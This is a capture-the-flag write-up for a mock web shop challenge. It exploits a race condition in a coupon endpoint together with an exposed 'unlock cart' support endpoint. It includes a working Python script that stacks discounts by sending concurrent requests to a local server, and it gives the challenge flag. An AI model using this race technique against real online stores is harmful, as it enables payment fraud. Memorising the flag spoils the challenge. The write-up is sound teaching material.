# Arbitrage II: The Locked Market - Detailed Writeup

## Challenge Description
**Goal:** Purchase "The Shadow Flag" which costs **$1,000**.
**Starting Balance:** $100.00.
**Context:** After the previous incident, the shop developers implemented a "secure transaction lock" to prevent coupon stacking.
<img width="1325" height="739" alt="image" src="https://github.com/user-attachments/assets/b45d9997-d318-4377-bbf2-bc71adcfbe2e" />

## Step 1: Reconnaissance
The shop looks identical to the previous version. We can add items and apply coupons.
However, if we try to spam the coupon, we get an error: `Transaction in progress. Please wait.`

## Step 2: Source Code Analysis


We see the `apply_coupon` logic has changed:

```javascript
// 2. LOCK (Mitigation)
if (cart.locked) {
    return res.json({ status: 'error', msg: 'Transaction in progress. Please wait.' });
}
cart.locked = true;

try {
    // 3. LATENCY
    await sleep(500);

    // 4. ACT
    cart.coupons_applied += 1;
    cart.discount += COUPON_VALUE;
} finally {
    cart.locked = false;
}
```

This looks secure. It checks if locked, sets lock, does work, then unlocks. Even with the sleep, a second request will hit `if (cart.locked)` and fail.

However, we notice a new endpoint:

```javascript
// New "Support" endpoint to fix stuck carts
app.post('/api/support/unlock_cart', (req, res) => {
    // ...
    if (cart) {
        cart.locked = false; // <--- VULNERABILITY
        return res.json({ status: 'success', msg: 'Cart unlocked.' });
    }
    // ...
});
```

This endpoint allows us to manually set `cart.locked = false`.

## Step 3: The Exploit Strategy
We can bypass the lock by manually unlocking it *while* the first request is sleeping.

**The Attack Flow:**
1.  **Request A:** Call `apply_coupon`.
    *   Server: Checks lock (false), sets lock (true), sleeps (500ms).
2.  **Request B:** Immediately call `/api/support/unlock_cart`.
    *   Server: Sets lock (false).
3.  **Request C:** Call `apply_coupon` (before Request A wakes up).
    *   Server: Checks lock (false), sets lock (true), sleeps (500ms).

Now both Request A and Request C are sleeping.
When they wake up:
*   **Request A:** Increments `coupons_applied` (0 -> 1), adds discount. Unlocks.
*   **Request C:** Increments `coupons_applied` (1 -> 2), adds discount. Unlocks.

Wait, Request C needs to pass the `if (cart.coupons_applied > 0)` check too!
Does that check happen *before* or *after* the sleep?

```javascript
// 1. CHECK
if (cart.coupons_applied > 0) {
    return res.json({ status: 'error', msg: 'Coupon already applied!' });
}
// 2. LOCK
// ...
// 3. SLEEP
```

The check happens **before** the sleep.
So:
1.  Req A: Checks applied (0) -> OK. Locks. Sleeps.
2.  Req B (Unlock): Unlocks.
3.  Req C: Checks applied (0) -> OK (because Req A hasn't incremented it yet!). Locks. Sleeps.

Perfect! Both requests pass the "already applied" check because neither has finished applying it yet.

## Step 4: Exploitation Script

We need to send these requests rapidly.

```python
import requests
import threading
import time

URL = "http://localhost:5001"
s = requests.Session()

# 1. Login
s.post(f"{URL}/register", data={"username": "hacker"})

# 2. Add Flag (Price: 1000)
# We need $1000 discount. Coupon is $100. We need 10 applications.
s.post(f"{URL}/cart/add", data={"item": "flag"})

def attack_cycle():
    # Start a coupon application
    t1 = threading.Thread(target=lambda: s.post(f"{URL}/cart/apply_coupon", data={"code": "SHADOW_DISCOUNT"}))
    t1.start()
    
    # Wait a tiny bit to ensure T1 grabbed the lock
    time.sleep(0.1)
    
    # Force unlock
    s.post(f"{URL}/api/support/unlock_cart")
    
    # T1 is still sleeping (total 500ms), so we don't need to do anything else for this cycle to "start".
    # But to stack 10 times, we need to repeat this.
    # Actually, we can just launch 10 threads of (Apply -> Wait -> Unlock -> Apply...)
    # But simpler: Launch Apply, Unlock, Apply, Unlock... rapidly.

# Better approach:
# We want 10 concurrent 'apply_coupon' requests to be in the 'sleep' phase at the same time.
# Loop 10 times:
#   Send Apply (Async)
#   Sleep 0.05s
#   Send Unlock
#   Sleep 0.05s

threads = []
for _ in range(15): # Try 15 times to be safe
    t = threading.Thread(target=lambda: s.post(f"{URL}/cart/apply_coupon", data={"code": "SHADOW_DISCOUNT"}))
    threads.append(t)
    t.start()
    time.sleep(0.05) # Give it time to hit the lock
    s.post(f"{URL}/api/support/unlock_cart") # Unlock it for the next one

for t in threads:
    t.join()

# 3. Checkout
res = s.post(f"{URL}/checkout/pay").json()
print(res)
```

## Flag
`L3monCTF{l0cks_ar3_0nly_as_str0ng_as_th3_k3y_h0ld3r}`
